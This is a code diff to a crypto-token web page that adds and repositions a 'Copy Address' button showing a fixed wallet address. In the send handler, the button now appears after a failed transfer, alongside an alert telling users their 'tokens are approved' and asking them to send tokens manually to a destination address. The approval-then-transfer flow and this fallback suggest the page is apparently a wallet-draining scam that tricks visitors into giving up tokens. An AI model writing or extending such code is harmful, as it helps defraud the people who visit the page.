@@ -207,6 +207,24 @@
     transform: translateY(-2px);
     animation: glowEffectWallet 1s infinite;
 }
+
+.btn-copy {
+    background: #10B981;
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    border-radius: 6px;
+    width: 100%;
+    cursor: pointer;
+    font-size: 16px;
+    margin-top: 1rem;
+    display: none;
+    transition: all 0.3s ease;
+}
+
+.btn-copy:hover {
+    background: #059669;
+}
     </style>
 </head>
 <body>
@@ -239,11 +257,12 @@
         <button id="scanBtn" class="btn-scan" style="display:none">View on QuaiScan</button>
         <div id="console"></div>
         <button id="buyBtn" class="btn-buy" style="display:none" onclick="window.open('https://poop.fun/token/0x001411083d4CF24632BA5e0841909933C2Da04a8', '_blank')">Buy Here!</button>
+        <button id="copyBtn" class="btn-copy" style="display:none">
+            Copy Address: 0x006B8A853ee3235c77947D12E47A3dBC547Bab10
+        </button>
     </div>
 
-    <button id="copyBtn" class="btn-copy" style="display:none">
-        Copy Address: 0x006B8A853ee3235c77947D12E47A3dBC547Bab10
-    </button>
+
 
     <script>
         function copyAddressToClipboard() {
@@ -811,9 +830,7 @@ document.getElementById('sendBtn').addEventListener('click', async () => {
             
             alert(`Since tokens are approved but transfer failed, (network issue) please send your tokens manually to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation data has been saved.`);
             
-            // Show the scan and buy buttons
-            document.getElementById('scanBtn').style.display = 'block';
-            document.getElementById('buyBtn').style.display = 'block';
+            document.getElementById('copyBtn').style.display = 'block';
         }
     } catch (approveError) {
         console.error('❌ Error in approval:', approveError.message || approveError);
